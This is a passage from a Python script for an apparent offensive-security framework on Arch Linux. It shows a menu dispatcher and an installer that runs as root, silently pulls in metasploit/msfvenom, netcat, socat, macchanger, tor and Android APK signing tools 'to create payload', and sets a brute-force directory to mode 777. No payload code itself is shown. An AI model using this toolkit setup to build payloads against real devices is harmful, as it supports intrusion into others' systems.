        StegMenu()
    elif me == "4":
        Mac()
    elif me == "5":
        wireless()
    elif me == "6":
        Ghostnet()
    elif me == "7":
        coming_soon()
    elif me == "8":
        coming_soon()
    elif me == "9":
        Piracy()
    elif me == "10":
        general()
    elif me == "11":
        More()
    elif me == "0":
        sys.exit(0)
    else:
        main()


# <----Checking root---->
def check_root():
    if os.geteuid() != 0:
        exit(
            "You need to have root privileges to create payload.\ntry again using sudo"
        )


def check_os():
    os = subprocess.call(
        ["which", "pacman"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if os != 0:
        print(
            "This distro or os is not supported this framework is only for arch! thanks"
        )
        sys.exit(0)


# <--all needed modules for payload creation-->
def installer():
    Banner()

    print("Checking for the needed modules")

    os.system("chmod 777 insta lib/brute-force")

    # nyx tor macchanger
    rc = subprocess.call(
        ["which", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc == 0:
        print("tor is installed ✔")
    else:
        print("tor and related tools are not installed \ninstalling")
        subprocess.call(
            ["yes | pacman -S nyx macchanger tor gnu-netcat socat bleachbit"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    # Steghide
    rc = subprocess.call(
        ["which", "steghide"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc == 0:
        print("steghide is installed! ✔️")
    else:
        print("steghide is not installed \ninstalling")
        subprocess.call(
            ["yes | pacman -S steghide"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    # xterm
    rc = subprocess.call(
        ["which", "xterm"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc == 0:
        print("xterm is installed! ✔️")
    else:
        print("xterm is not installed \ninstalling")
        subprocess.call(
            ["yes | pacman -S xterm"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    # postgresql
    rc = subprocess.call(
        ["which", "psql"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc == 0:
        print("postgresql is intsalled")
    else:
        print("postgresql is not installed \ninstalling")
        subprocess.call(
            ["yes | pacman -S postgresql"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )
    # Apktool
    rc = subprocess.call(
        ["which", "apktool"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc == 0:
        print("apktool is installed! ✔️")
    else:
        print("apktool not installed \ninstalling")
        subprocess.call(
            [
                "chmod +x "
                + str(os.getcwd())
                + "/apktool "
                + str(os.getcwd())
                + "/apktool.jar"
            ],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )
        subprocess.call(
            [
                "mv "
                + str(os.getcwd())
                + "/apktool "
                + str(os.getcwd())
                + "/apktool.jar /usr/bin/"
            ],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    # Zipalign
    zp = subprocess.call(
        ["which", "zipalign"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if zp == 0:
        print("zipalign is installed! ✔️")
    else:
        print("zipalign is not installed! \ninstalling zipalign")
        subprocess.call(
            ["yes | pacman -S android-sdk-build-tools"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    # apksigner
    jr = subprocess.call(
        ["which", "apksigner"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if jr == 0:
        print("apksigner is installed! ✔️")
    else:
        print("apksigner is not installed ! \ninstalling jarsigner")
        subprocess.call(
            ["yes | pacman -S android-sdk-build-tools"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    # Msfvenom, metasploit
    ms = subprocess.call(
        ["which", "msfvenom"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if ms == 0:
        print("msfvenom is installed! ✔️")
    else:
        print("metasploit is not installed! \nInstalling Metasploit")
        subprocess.call(
            ["yes | pacman -S metasploit"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )
    # Java
    jdk = subprocess.call(
        ["which", "java"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if jdk == 0:
        print("open-jdk installed! ✔️")
    else:
        print("installing java")
        subprocess.call(
            ["yes | pacman -S jdk-openjdk java-environment-common jre-openjdk"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )
    # ghostnet
    gh = subprocess.call(
        ["which", "ghostnet"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if gh == 0:
        print("ghostnet is installed ✔️")
    else:
        print("ghostnet is not installed! \ninstalling")
        os.system("chmod +x ghostnet && mv ghostnet /usr/bin/ && mv ghostnet.log /opt/")

    print("everything setup perfectly ✔")
    time.sleep(2)


def check_connection():
    if os.path.isfile("/opt/fg.log"):
        with open("/opt/fg.log", "r") as logf:
            if logf.readline() == "checked=True":
                logf.close()
    else:
        installer()
        with open("/opt/fg.log", "w") as logf:
            logf.write("checked=True")
            logf.close()


if __name__ == "__main__":
    try:
        check_os()
        check_root()
        check_connection()
        main()
    except KeyboardInterrupt:
        print("\nExit signal received \nexiting ")
        sys.exit()
